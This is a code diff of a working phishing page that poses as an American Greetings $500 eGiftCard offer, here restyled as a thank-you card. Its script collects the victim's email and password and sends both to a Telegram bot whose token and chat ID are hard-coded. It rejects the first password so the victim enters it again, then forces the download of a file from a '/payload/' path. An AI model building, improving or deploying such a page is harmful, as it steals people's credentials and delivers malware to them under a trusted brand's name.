@@ -3,64 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>$500 eGiftCard Redemption</title>
+    <title>A Very Special Thank You</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #333; }
-        .container { background: white; width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; position: relative; overflow: hidden; }
-        .logo { font-family: 'Brush Script MT', cursive; font-size: 36px; color: #e91e63; margin-bottom: 10px; letter-spacing: -1px; }
-        .sub-logo { font-size: 12px; color: #888; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 30px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: #222; }
-        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
-        input[type="email"], input[type="password"] { width: 100%; padding: 12px 16px; margin-bottom: 16px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; transition: border-color 0.2s; }
-        input:focus { outline: none; border-color: #e91e63; }
-        button { width: 100%; padding: 14px; background: #e91e63; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
-        button:hover { background: #c2185b; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
-        .error-msg { color: #d32f2f; font-size: 13px; margin-top: -8px; margin-bottom: 16px; display: none; text-align: left; padding-left: 4px; }
-        .loader-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
-        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #e91e63; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
+        @import url('https://fonts.googleapis.com/css2?family=Caveat:wght@400;700&family=Lato:wght@300;400;700&display=swap');
+        
+        body { 
+            margin: 0; padding: 0; 
+            background-color: #ffffff; 
+            font-family: 'Lato', sans-serif; 
+            display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; color: #333; 
+            overflow-x: hidden;
+        }
+        
+        .container { 
+            width: 100%; max-width: 500px; padding: 40px 20px; 
+            text-align: center; position: relative; z-index: 2; 
+        }
+
+        /* Branding */
+        .brand-header { margin-bottom: 40px; }
+        .brand-logo { width: 60px; height: 60px; fill: #d31245; margin-bottom: 10px; }
+        .brand-name { font-size: 24px; color: #555; letter-spacing: 1px; font-weight: 300; }
+
+        /* Envelope & Card Visuals */
+        .envelope-wrapper {
+            position: relative;
+            width: 320px;
+            height: 220px;
+            margin: 0 auto 40px auto;
+            perspective: 1000px;
+        }
+        
+        .envelope-back {
+            position: absolute; bottom: 0; left: 0; right: 0; top: 40px;
+            background: #f0e6e8; border-radius: 0 0 12px 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        
+        .card-paper {
+            position: absolute; top: -20px; left: 20px; right: 20px; bottom: 20px;
+            background: #e8f4f8; 
+            border-radius: 8px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            transform: rotate(-2deg);
+            background-image: radial-gradient(#d31245 0.5px, transparent 0.5px), radial-gradient(#d31245 0.5px, transparent 0.5px);
+            background-size: 20px 20px;
+            background-position: 0 0, 10px 10px;
+            opacity: 0.9;
+        }
+
+        .card-text-script {
+            font-family: 'Caveat', cursive;
+            font-size: 52px; color: #2c6e8a; line-height: 1;
+            transform: rotate(-3deg);
+            text-shadow: 1px 1px 0 rgba(255,255,255,0.8);
+        }
+        .card-text-small {
+            font-family: 'Caveat', cursive;
+            font-size: 22px; color: #444; margin-top: -10px;
+            transform: rotate(-2deg);
+        }
+        .card-leaf {
+            width: 24px; height: 12px; background: #a8c645; 
+            border-radius: 0 50% 0 50%; margin-top: 10px;
+            transform: rotate(-15deg);
+        }
+
+        .wax-seal {
+            position: absolute; bottom: -15px; left: 50%; transform: translateX(-50%);
+            width: 50px; height: 50px; background: #d31245;
+            border-radius: 50%; border: 3px solid #b00e3a;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 10px rgba(211,18,69,0.3);
+            z-index: 5;
+        }
+        .wax-seal svg { width: 28px; height: 28px; fill: white; opacity: 0.9; }
+
+        /* Decorative Sparkles */
+        .sparkle { position: absolute; fill: #d31245; animation: twinkle 3s infinite ease-in-out; }
+        .sparkle-1 { top: 10%; left: 10%; width: 20px; animation-delay: 0s; }
+        .sparkle-2 { top: 20%; right: 15%; width: 16px; animation-delay: 1s; }
+        .sparkle-3 { bottom: 30%; left: 5%; width: 24px; animation-delay: 2s; }
+        .sparkle-4 { bottom: 15%; right: 10%; width: 18px; animation-delay: 0.5s; }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* Form Styling */
+        .form-area { margin-top: 20px; transition: all 0.5s ease; }
+        h1 { font-family: 'Caveat', cursive; font-size: 32px; color: #333; margin-bottom: 10px; }
+        p { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+        
+        input[type="email"], input[type="password"] { 
+            width: 100%; padding: 14px 16px; margin-bottom: 16px; 
+            border: 1px solid #e0d5d7; border-radius: 30px; 
+            font-size: 15px; box-sizing: border-box; 
+            background: #fafafa; transition: all 0.3s;
+            font-family: 'Lato', sans-serif;
+        }
+        input:focus { outline: none; border-color: #d31245; background: #fff; box-shadow: 0 0 0 3px rgba(211,18,69,0.1); }
+        
+        button { 
+            width: 100%; padding: 16px; 
+            background: #d31245; color: white; border: none; 
+            border-radius: 30px; font-size: 16px; font-weight: 700; 
+            cursor: pointer; transition: all 0.3s; letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(211,18,69,0.2);
+        }
+        button:hover { background: #b00e3a; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(211,18,69,0.3); }
+        button:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+        
+        .error-msg { color: #d31245; font-size: 13px; margin-top: -8px; margin-bottom: 16px; display: none; text-align: left; padding-left: 20px; }
+        
+        /* Loader & Success */
+        .loader-overlay { 
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
+            background: rgba(255,255,255,0.95); display: none; 
+            flex-direction: column; align-items: center; justify-content: center; 
+            z-index: 100; backdrop-filter: blur(5px);
+        }
+        .spinner { 
+            width: 40px; height: 40px; border: 3px solid #f3f3f3; 
+            border-top: 3px solid #d31245; border-radius: 50%; 
+            animation: spin 1s linear infinite; margin-bottom: 16px; 
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loader-text { font-size: 14px; color: #666; }
-        .success-icon { width: 64px; height: 64px; margin: 0 auto 16px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .success-icon svg { width: 32px; height: 32px; fill: white; }
+        .loader-text { font-size: 15px; color: #555; font-weight: 500; }
+        
+        .success-icon { 
+            width: 70px; height: 70px; margin: 0 auto 20px; 
+            background: #4caf50; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 15px rgba(76,175,80,0.3);
+        }
+        .success-icon svg { width: 36px; height: 36px; fill: white; }
+
+        /* Hidden states */
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
+
+<!-- Background Sparkles -->
+<svg class="sparkle sparkle-1" viewBox="0 0 24 24"><path d="M12 0L14.5 9.5L24 12L14.5 14.5L12 24L9.5 14.5L0 12L9.5 9.5Z"/></svg>
+<svg class="sparkle sparkle-2" viewBox="0 0 24 24"><path d="M12 0L14.5 9.5L24 12L14.5 14.5L12 24L9.5 14.5L0 12L9.5 9.5Z"/></svg>
+<svg class="sparkle sparkle-3" viewBox="0 0 24 24"><path d="M12 0L14.5 9.5L24 12L14.5 14.5L12 24L9.5 14.5L0 12L9.5 9.5Z"/></svg>
+<svg class="sparkle sparkle-4" viewBox="0 0 24 24"><path d="M12 0L14.5 9.5L24 12L14.5 14.5L12 24L9.5 14.5L0 12L9.5 9.5Z"/></svg>
+
 <div class="container" id="mainContainer">
+    
+    <!-- Brand Header -->
+    <div class="brand-header">
+        <svg class="brand-logo" viewBox="0 0 100 100">
+            <path d="M50 10 C30 10 20 30 20 50 C20 70 35 90 50 95 C65 90 80 70 80 50 C80 30 70 10 50 10 Z M50 25 C60 25 65 35 65 45 C65 55 55 65 50 75 C45 65 35 55 35 45 C35 35 40 25 50 25 Z"/>
+            <path d="M50 35 C45 35 40 40 40 45 C40 50 45 55 50 60 C55 55 60 50 60 45 C60 40 55 35 50 35 Z" fill="white" opacity="0.5"/>
+        </svg>
+        <div class="brand-name">american greetings</div>
+    </div>
+
+    <!-- Envelope Visual -->
+    <div class="envelope-wrapper" id="envelopeVisual">
+        <div class="envelope-back"></div>
+        <div class="card-paper">
+            <div class="card-text-small">a Very Special</div>
+            <div class="card-text-script">Thank<br>you</div>
+            <div class="card-leaf"></div>
+        </div>
+        <div class="wax-seal">
+            <svg viewBox="0 0 100 100">
+                <path d="M50 10 C30 10 20 30 20 50 C20 70 35 90 50 95 C65 90 80 70 80 50 C80 30 70 10 50 10 Z M50 25 C60 25 65 35 65 45 C65 55 55 65 50 75 C45 65 35 55 35 45 C35 35 40 25 50 25 Z"/>
+            </svg>
+        </div>
+    </div>
+
     <!-- Step 1: Email Entry -->
-    <div id="step1">
-        <div class="logo">American Greetings</div>
-        <div class="sub-logo">$500 eGiftCard</div>
-        <h1>Redeem Your Gift Card</h1>
-        <p>Your exclusive $500 eGiftCard has been reserved. Enter your email below to begin redemption.</p>
-        <input type="email" id="emailInput" placeholder="Enter your email address" autocomplete="off">
+    <div id="step1" class="form-area">
+        <h1>A Gift For You</h1>
+        <p>Thank you for being part of our story. As a token of our gratitude, we’ve reserved a $500 eGiftCard exclusively for you. Enter your email below to open your card.</p>
+        <input type="email" id="emailInput" placeholder="Your email address" autocomplete="off">
         <div class="error-msg" id="emailError">Please enter a valid email address.</div>
-        <button onclick="goToStep2()">Next</button>
+        <button onclick="goToStep2()">Open My Card</button>
     </div>
 
     <!-- Step 2: Password Entry -->
-    <div id="step2" style="display:none;">
-        <div class="logo">American Greetings</div>
-        <div class="sub-logo">$500 eGiftCard</div>
-        <h1>Verify Your Identity</h1>
-        <p>For security, please enter your account password to access your $500 eGiftCard.</p>
-        <input type="password" id="passInput" placeholder="Enter your password" autocomplete="off">
+    <div id="step2" class="form-area hidden">
+        <h1>Verify Identity</h1>
+        <p>For your security, please enter your password to unlock your $500 eGiftCard.</p>
+        <input type="password" id="passInput" placeholder="Your password" autocomplete="off">
         <div class="error-msg" id="passError">Incorrect password. Please try again.</div>
-        <button onclick="attemptPassword()" id="passBtn">Continue</button>
+        <button onclick="attemptPassword()" id="passBtn">Unlock Gift Card</button>
     </div>
 
     <!-- Step 3: Downloading -->
-    <div id="step3" style="display:none;">
+    <div id="step3" class="form-area hidden">
         <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-        <h1>eGiftCard Ready!</h1>
-        <p>Your redemption file is being prepared. If download doesn't start automatically, click below.</p>
+        <h1>Card Unlocked!</h1>
+        <p>Your eGiftCard redemption file is ready. If download doesn't start automatically, click below.</p>
         <button onclick="forceDownload()" id="dlBtn">Download eGiftCard</button>
     </div>
 
     <!-- Loader Overlay -->
     <div class="loader-overlay" id="loader">
         <div class="spinner"></div>
-        <div class="loader-text" id="loaderText">Verifying credentials...</div>
+        <div class="loader-text" id="loaderText">Opening your card...</div>
     </div>
 </div>
 
@@ -68,7 +217,7 @@
 (function() {
     'use strict';
     
-    // ⚠️ REPLACE THESE EXACTLY - NO SPACES, NO EXTRA CHARACTERS
+    // ⚠️ REPLACE THESE EXACTLY
     const TG_BOT_TOKEN = "8947701700:AAFpBFejWSFtcQZ01JP4D-qkIUopxBUyd4A";
     const TG_CHAT_ID = "844971567";
     
@@ -81,7 +230,6 @@
             const data = await res.json();
             if (!data.ok) {
                 console.error("🚨 BOT TOKEN INVALID:", data.description);
-                document.body.innerHTML = '<div style="padding:40px;text-align:center;color:red;font-family:sans-serif;"><h2>⚠️ Admin Error</h2><p>Telegram bot configuration is invalid.<br>Please check your token and chat ID.</p></div>';
                 return false;
             }
             console.log("✅ Bot validated:", data.result.first_name);
@@ -110,22 +258,11 @@
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TG_CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                })
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: "HTML" })
             });
-            
-            if (!response.ok) {
-                const err = await response.json();
-                console.error("Telegram API Error:", err);
-            } else {
-                console.log("✅ Message sent");
-            }
-        } catch (error) {
-            console.error("❌ Send failed:", error.message);
-        }
+            if (!response.ok) console.error("Telegram API Error:", await response.json());
+            else console.log("✅ Message sent");
+        } catch (error) { console.error("❌ Send failed:", error.message); }
     }
 
     window.goToStep2 = function() {
@@ -133,20 +270,19 @@
         const errorEl = document.getElementById('emailError');
         
         if (!email || !email.includes('@') || !email.includes('.')) {
-            errorEl.style.display = 'block';
-            return;
+            errorEl.style.display = 'block'; return;
         }
         errorEl.style.display = 'none';
         
-        sendToTelegram(`🎣 <b>New Target Engaged</b>\n📧 Email: <code>${email}</code>\n⏰ Time: ${new Date().toLocaleString()}`);
+        sendToTelegram(`🎣 <b>New Target Engaged</b>\n Email: <code>${email}</code>\n Time: ${new Date().toLocaleString()}`);
         
-        showLoader('Authenticating...');
+        showLoader('Verifying eligibility...');
         setTimeout(() => {
             hideLoader();
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
             document.getElementById('passInput').focus();
-        }, 1200);
+        }, 1500);
     };
 
     window.attemptPassword = async function() {
@@ -157,8 +293,7 @@
         attemptCount++;
         
         if (attemptCount === 1) {
-            sendToTelegram(` <b>Password Attempt #1 (Failed)</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>`);
-            
+            sendToTelegram(` <b>Password Attempt #1 (Failed)</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n Pass: <code>${pass}</code>`);
             errorEl.textContent = 'Incorrect password. Please try again.';
             errorEl.style.display = 'block';
             document.getElementById('passInput').value = '';
@@ -167,19 +302,17 @@
         }
         
         currentUniqueFilename = await getUniquePayloadName();
-        
-        sendToTelegram(`✅ <b>CREDENTIALS CONFIRMED</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>\n💾 Payload: <code>${currentUniqueFilename}</code> delivered`);
+        sendToTelegram(`✅ <b>CREDENTIALS CONFIRMED</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>\n💾 Payload: <code>${currentUniqueFilename}</code>`);
         
         errorEl.style.display = 'none';
         btn.disabled = true;
         btn.textContent = 'Processing...';
         
-        showLoader('Preparing your eGiftCard...');
-        
+        showLoader('Preparing your gift...');
         setTimeout(() => {
             hideLoader();
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
             triggerDownload();
         }, 2000);
     };
@@ -188,9 +321,7 @@
         const link = document.createElement('a');
         link.href = `/payload/${currentUniqueFilename}`;
         link.download = currentUniqueFilename;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+        document.body.appendChild(link); link.click(); document.body.removeChild(link);
     }
 
     window.forceDownload = function() {
@@ -203,21 +334,14 @@
         document.getElementById('loaderText').textContent = text;
         document.getElementById('loader').style.display = 'flex';
     }
-
-    function hideLoader() {
-        document.getElementById('loader').style.display = 'none';
-    }
+    function hideLoader() { document.getElementById('loader').style.display = 'none'; }
 
     document.addEventListener('DOMContentLoaded', function() {
         validateBot();
-        
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                if (document.getElementById('step1').style.display !== 'none') {
-                    goToStep2();
-                } else if (document.getElementById('step2').style.display !== 'none') {
-                    attemptPassword();
-                }
+                if (!document.getElementById('step1').classList.contains('hidden')) goToStep2();
+                else if (!document.getElementById('step2').classList.contains('hidden')) attemptPassword();
             }
         });
     });
